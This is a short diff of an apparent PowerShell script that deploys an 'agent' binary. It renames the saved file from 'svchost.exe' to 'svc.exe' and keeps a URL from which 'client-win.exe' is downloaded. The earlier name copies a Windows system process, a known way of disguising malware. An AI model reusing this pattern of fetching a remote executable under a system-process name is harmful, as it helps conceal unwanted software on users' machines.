@@ -5,7 +5,7 @@ if (-not (Test-Path $dest)) {
 }
 
 # Agent binary full path
-$agentPath = Join-Path $dest "svchost.exe"
+$agentPath = Join-Path $dest "svc.exe"
 
 # Agent binary download URL (replace with your actual URL)
 $agentUrl = "https://draysongz.github.io/bin/client-win.exe"
